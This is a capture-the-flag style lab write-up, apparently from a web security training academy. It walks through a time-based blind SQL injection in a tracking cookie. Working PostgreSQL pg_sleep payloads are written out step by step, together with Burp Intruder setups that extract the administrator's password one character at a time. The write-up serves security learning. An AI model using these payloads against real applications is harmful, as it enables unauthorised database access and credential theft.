*This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.*

Observed the HTTP History after clicking on the login page: 
```Burp Request
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT;
...
```

Injecting a `'` into the cookie value: 
```
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'; 
```
resulted in a immediate 200 status code: 
```Burp 
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3195
```

After trying each syntax for specific to different databases, I found that PostgreSQL worked for the time delay:
```Burp 
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
```
This gave a 10s time delay. 

I then verified the username *administrator* by modifying the request to the following: 
```Burp 
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
...
```
This gave a 10s time delay as well. 

I then moved on to enumerate the length of the password, with the initial query in the Repeater as: 
```Burp 
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (length(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
```
This gave a 10s time delay, so I sent this modified request to the Intruder and made the payload as such: 
```Burp 
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (length(password)>§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
```
![Screenshot 2024-05-02 at 6.46.33 PM](images/Screenshot%202024-05-02%20at%206.46.33%20PM.png)
Based on the *Sniper* attack, I found the following results: 
![Screenshot 2024-05-02 at 6.51.18 PM](images/Screenshot%202024-05-02%20at%206.51.18%20PM.png)
Based on the results, the length of the password is 20 characters excluding the lagged response received (>20s). 

Now it is time to find out the value of each character in the password. 

I modified the query to the following and implemented the *Cluster Bomb* feature: 
```Burp 
GET /login HTTP/2
Host: 0ac000de03ddee1c804b2179004d0009.web-security-academy.net
Cookie: TrackingId=9sPIYHq3rQtbWoNT'%3b SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--;session=HigjdhDtl8NPRf7WMcHSWBOAi2ik9o1q
...
```
![Screenshot 2024-05-02 at 7.02.40 PM](images/Screenshot%202024-05-02%20at%207.02.40%20PM.png)
![Screenshot 2024-05-02 at 7.03.01 PM](images/Screenshot%202024-05-02%20at%207.03.01%20PM.png)
I got the following results after filtering by those with ~10s response received: 
![Screenshot 2024-05-02 at 7.04.22 PM](images/Screenshot%202024-05-02%20at%207.04.22%20PM.png)
Piecing together the password, I got : 
`kjdh0dt60ifw4t456lqr`

Logged in with the credentials!
![Screenshot 2024-05-02 at 7.12.31 PM](images/Screenshot%202024-05-02%20at%207.12.31%20PM.png)